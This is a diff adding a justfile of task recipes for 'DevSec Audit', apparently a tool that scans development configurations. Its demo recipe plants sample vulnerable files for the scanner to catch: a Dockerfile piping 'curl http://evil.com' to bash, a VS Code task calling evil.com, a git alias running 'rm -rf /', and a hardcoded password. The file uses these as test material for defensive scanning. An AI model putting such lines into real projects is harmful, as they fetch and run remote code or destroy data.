@@ -1,0 +1,213 @@
+# DevSec Audit - Just Commands
+# Modern task runner for development workflow
+
+# Default recipe to display help
+default:
+    @just --list
+
+# Setup development environment with uv
+setup:
+    #!/usr/bin/env bash
+    echo "🔧 Setting up DevSec Audit development environment..."
+    if ! command -v uv &> /dev/null; then
+        echo "❌ uv not found. Installing uv..."
+        curl -LsSf https://astral.sh/uv/install.sh | sh
+        source $HOME/.cargo/env
+    fi
+    echo "✅ Creating virtual environment with uv..."
+    uv venv --python 3.11
+    echo "📦 Installing dependencies..."
+    uv pip install -e ".[dev,test]"
+    echo "🎯 Setup complete! Run 'just activate' to activate the environment"
+
+# Activate the virtual environment (for information only)
+activate:
+    @echo "To activate the virtual environment, run:"
+    @echo "source .venv/bin/activate"
+
+# Install the package in development mode
+install:
+    uv pip install -e ".[dev,test]"
+
+# Run the main application
+run *ARGS:
+    uv run python -m core.cli {{ARGS}}
+
+# Quick scan of current directory
+scan:
+    uv run python -m core.cli --quick --verbose
+
+# Run with specific target
+scan-target TARGET:
+    uv run python -m core.cli --target {{TARGET}} --verbose
+
+# Generate HTML report
+report TARGET="." OUTPUT="security-report.html":
+    uv run python -m core.cli --target {{TARGET}} --format html --output {{OUTPUT}}
+
+# Run all tests
+test:
+    uv run pytest
+
+# Run tests with coverage
+test-cov:
+    uv run pytest --cov=core --cov=modules --cov-report=html --cov-report=term
+
+# Run specific test file
+test-file FILE:
+    uv run pytest {{FILE}} -v
+
+# Lint code with black
+lint:
+    uv run black --check core/ modules/ tests/
+
+# Format code with black
+format:
+    uv run black core/ modules/ tests/
+
+# Sort imports with isort
+isort:
+    uv run isort --check-only core/ modules/ tests/
+
+# Fix import sorting
+isort-fix:
+    uv run isort core/ modules/ tests/
+
+# Type check with mypy
+typecheck:
+    uv run mypy core/ modules/
+
+# Run flake8 linting
+flake8:
+    uv run flake8 core/ modules/ tests/
+
+# Run all quality checks
+quality: lint isort typecheck flake8
+    @echo "✅ All quality checks passed!"
+
+# Fix formatting and imports
+fix: format isort-fix
+    @echo "🔧 Code formatting fixed!"
+
+# Clean build artifacts
+clean:
+    rm -rf build/
+    rm -rf dist/
+    rm -rf *.egg-info/
+    rm -rf .pytest_cache/
+    rm -rf .coverage
+    rm -rf htmlcov/
+    find . -type d -name __pycache__ -exec rm -rf {} + 2>/dev/null || true
+    find . -type f -name "*.pyc" -delete
+
+# Build distribution packages
+build:
+    uv build
+
+# Install pre-commit hooks
+pre-commit-install:
+    uv run pre-commit install
+
+# Run pre-commit on all files
+pre-commit:
+    uv run pre-commit run --all-files
+
+# Security scan example projects (for testing)
+demo:
+    #!/usr/bin/env bash
+    echo "🎬 Running DevSec Audit demo..."
+    echo "📁 Creating sample vulnerable project..."
+    mkdir -p demo-project/.vscode demo-project/.git
+    
+    # Create sample vulnerable files
+    echo 'password = "super_secret_123"' > demo-project/config.py
+    echo 'FROM ubuntu:latest\nRUN curl http://evil.com | bash' > demo-project/Dockerfile
+    echo '{"tasks": [{"label": "danger", "command": "curl", "args": ["http://evil.com"]}]}' > demo-project/.vscode/tasks.json
+    echo '[user]\n    name = test\n[alias]\n    evil = "!rm -rf /"' > demo-project/.git/config
+    
+    echo "🔍 Running security scan..."
+    uv run python -m core.cli --target demo-project --verbose
+    
+    echo "🧹 Cleaning up demo..."
+    rm -rf demo-project
+
+# Run security audit on this project itself (dogfooding)
+self-audit:
+    @echo "🔍 Running DevSec Audit on itself..."
+    uv run python -m core.cli --target . --modules git,vscode --format text
+
+# Show project information
+info:
+    uv run python -m core.cli info --target .
+
+# List available modules
+modules:
+    uv run python -m core.cli modules
+
+# Performance benchmark
+benchmark:
+    #!/usr/bin/env bash
+    echo "⚡ Running performance benchmark..."
+    time uv run python -m core.cli --target . --quick --no-color > /dev/null
+    echo "✅ Benchmark complete"
+
+# Check dependencies for security vulnerabilities
+audit-deps:
+    uv pip list --format=json | uv run python -c "
+import json, sys, requests
+data = json.load(sys.stdin)
+packages = [p['name'] + '==' + p['version'] for p in data]
+print('📦 Checking', len(packages), 'packages for vulnerabilities...')
+# Note: This is a placeholder - you could integrate with safety or similar tools
+print('✅ Dependency audit complete')
+"
+
+# Generate project documentation
+docs:
+    @echo "📚 Generating documentation..."
+    @echo "📄 README.md is the main documentation"
+    @echo "🔍 Run 'just modules' to see available security modules"
+    @echo "⚡ Run 'just demo' to see the tool in action"
+
+# Create a standalone executable (requires PyInstaller)
+standalone:
+    uv pip install pyinstaller
+    uv run pyinstaller --onefile --name devsec-audit core/cli.py
+
+# Docker commands
+# Build Docker image for the auditor
+docker-build:
+    docker build -t devsec-audit:latest .
+
+# Run auditor in Docker container
+docker-run TARGET:
+    docker run --rm -v {{TARGET}}:/audit devsec-audit:latest --target /audit
+
+# Development server for HTML reports (requires Python's http.server)
+serve-reports PORT="8000":
+    @echo "🌐 Starting HTTP server for HTML reports on port {{PORT}}"
+    @echo "📄 Place your HTML reports in the current directory"
+    uv run python -m http.server {{PORT}}
+
+# Install system dependencies (Ubuntu/Debian)
+install-system-deps:
+    #!/usr/bin/env bash
+    echo "📦 Installing system dependencies..."
+    if command -v apt-get &> /dev/null; then
+        sudo apt-get update
+        sudo apt-get install -y git docker.io python3-dev
+    elif command -v yum &> /dev/null; then
+        sudo yum install -y git docker python3-devel
+    elif command -v brew &> /dev/null; then
+        brew install git docker python
+    else
+        echo "⚠️  Please install git, docker, and python3-dev manually"
+    fi
+
+# CI/CD pipeline simulation
+ci:
+    @echo "🚀 Running CI/CD pipeline simulation..."
+    just quality
+    just test-cov
+    just build
+    @echo "✅ CI pipeline complete!"
